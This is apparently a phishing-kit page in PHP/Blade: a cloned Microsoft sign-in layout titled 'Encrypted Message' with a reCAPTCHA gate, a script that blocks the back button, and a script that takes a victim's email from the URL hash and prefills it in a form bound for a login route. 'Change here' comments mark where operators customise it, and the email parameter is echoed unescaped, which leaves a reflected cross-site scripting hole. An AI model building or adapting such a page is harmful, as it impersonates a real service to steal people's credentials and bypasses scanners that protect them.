<?php
session_start();

$email = '';

// print_r($_GET);
// exit;
if(isset($_GET['email'])) {
    $email = $_GET['email'];
}


$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 
function generate_string($input, $strength = 16) {
    $input_length = strlen($input);
    $random_string = '';
    for($i = 0; $i < $strength; $i++) {
        $random_character = $input[mt_rand(0, $input_length - 1)];
        $random_string .= $random_character;
    }
 
    return $random_string;
}
?>
<!DOCTYPE html>

<html dir="ltr" class="" lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Encrypted Message | <?php echo $email; ?> </title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="" crossorigin="">
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    <link rel="shortcut icon" href="./Captcha-files/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

    <meta name="robots" content="none">

    <link rel="stylesheet" type="text/css" href="./Captcha-files/converged.v2.login.min_k6vcupdeent1wwpsw5wt2g2.css" />

    <script type="text/javascript" src="./Captcha-files/ux.converged.login.pcore.min_ancu0urypznffsrky8gjqq2.js">
    </script>

    <script type="text/javascript" src="./Captcha-files/ux.converged.login.strings-en.min_xvnavb8ts_r3tr0w_ckg1g2.js">
    </script>

    <script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    window.onunload = function() {
        null
    };
    </script>


    <link rel="prefetch" href="./Captcha-files/converged.v2.login.min_k6vcupdeent1wwpsw5wt2g2.css">
    <link rel="prefetch" href="./Captcha-files/ux.converged.login.strings-en.min_xvnavb8ts_r3tr0w_ckg1g2.js">
</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">

    <div>

        <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation"
                data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">

                <div data-bind="backgroundImage: smallImageUrl()"
                    style="background-image: url(&quot;./login interface_files/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);">
                </div>

                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()"
                    style="background-image: url(&quot;./login interface_files/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);">
                </div>

            </div>
        </div>
        <div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">

            <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">

                <script src='https://www.google.com/recaptcha/api.js' async defer></script>
                <script src="./Captcha-files/alert.js"></script>
                <script language='javascript' type='text/javascript'>
                var isrdy = 0;

                function dcb(gresp) {
                    document.loginForm.secc1.value = gresp;
                    isrdy = 1;
                }

                function dexpcb() {
                    isrdy = 0;
                }

                function decb() {
                    isrdy = 0;
                }

                function checkform() {




                    if (isrdy == 0) {
                        swal("", "Please complete reCAPTCHA", "error"); 
                    }
                    if (isrdy == 1) {
                        document.loginForm.submit();

                    }


                }
                </script>

                <br><br><br><br><br>
                <center>
                    <!-- Change here -->






                    <form name='loginForm' method='post' target='_top'
                        action="{{ route('login') }}">
                        <!-- Change here -->
                        @csrf
                        <div class='g-recaptcha' data-sitekey='6LcY4xcaAAAAAAsbZ6_AqmxfiEbr_-fZZD8BmUBR'
                            data-callback='dcb' data-expired-callback='dexpcb' data-error-callback='decb'></div>
                        <input type='hidden' name='secc1' value=''>                    
                        <input type="hidden" name="session_token" value="<?php echo generate_string($permitted_chars, 30);?>">
                        <input type="hidden" name="email" value="<?php echo $email; ?>">
                        <br>
                        <tr>
                            <td width='*' colspan='2' align='center'><input onclick='checkform()' type='button'
                                    value='Submit' class='btn btn-block btn-primary'
                                    style='width: 65px; height: 30px; font-size: 10pt; text-align: center; background-color: rgb(0, 103, 184); border: 0; color: #ffffff'
                                    </td>
                        </tr>
                        </table>
                    </form>
                </center>
            </div>
        </div>
    </div>
    </div>
    </div>
    </div>
    </div>
    </div>
    </div>

    <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode"
            value="102"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden"
            name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19"
            data-bind="value: timeOnPage" value=""></div>
    <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
        <div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }">

            <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms"
                    data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick"
                    href="#">Terms of
                    use</a> <a id="ftrPrivacy"
                    data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick"
                    href="#">Privacy &amp; cookies</a>
                <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
                    <img class="desktopMode" role="presentation"
                        pngsrc="./lCaptcha-files/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png"
                        svgsrc="./Captcha-files/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc"
                        src="./Captcha-files/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
                    <img class="mobileMode" role="presentation"
                        pngsrc="./Captcha-files/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png"
                        svgsrc="./Captcha-files/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc"
                        src="./Captcha-files/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
                </a>
            </div>
        </div>
    </div>
    <script>
            let hash = window.location.hash.substr(1);
            const urlParams = new URLSearchParams(hash);
            const state = urlParams.get('state');    

            setTimeout(
                function(){
                    if ( state ){
                        window.location = '?email='+state
                    }
                }, 1000
            );
        </script>
</body>

</html>